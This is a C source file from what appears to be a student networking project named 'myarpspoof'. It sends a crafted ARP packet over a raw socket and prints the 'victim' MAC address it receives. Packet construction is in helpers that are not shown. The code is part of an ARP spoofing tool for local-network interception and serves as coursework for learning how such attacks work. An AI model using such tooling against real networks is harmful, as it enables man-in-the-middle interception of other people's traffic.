/*
** EPITECH PROJECT, 2022
** NWP_myarpspoof_2018
** File description:
** Created by lucasg,
*/

#include <net/if.h>
#include "arp.h"

unsigned char *process_arp_spoofing(char *packet,
    struct sockaddr_ll *arp_sockaddr)
{
    int arp_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    char buffer[PACKET_LEN];
    ssize_t len = 0;

    if (sendto(arp_socket, packet, PACKET_LEN, 0,
        (struct sockaddr *) arp_sockaddr, sizeof(*arp_sockaddr)) < 0)
        return NULL;
    len = recv(arp_socket, buffer, PACKET_LEN, 0);
    if (len == 0)
        return NULL;
    return retrieve_mac_addr_from_frame(buffer);
}

int main(int ac, char **av)
{
    params_t *params = parse(ac, av);
    int local_socket = create_socket();
    struct sockaddr_ll *arp_sockaddr = create_arp_socketaddr(params);
    arp_hdr_t *arp = create_arp_paquet(params, local_socket);
    char *packet = create_sendable_packets(arp, arp_sockaddr, params);
    unsigned char *victim_mac_addr = NULL;

    close(local_socket);
    victim_mac_addr = process_arp_spoofing(packet, arp_sockaddr);
    print_victim_mac_addr(victim_mac_addr);
    delete_params(params);
    return 0;
}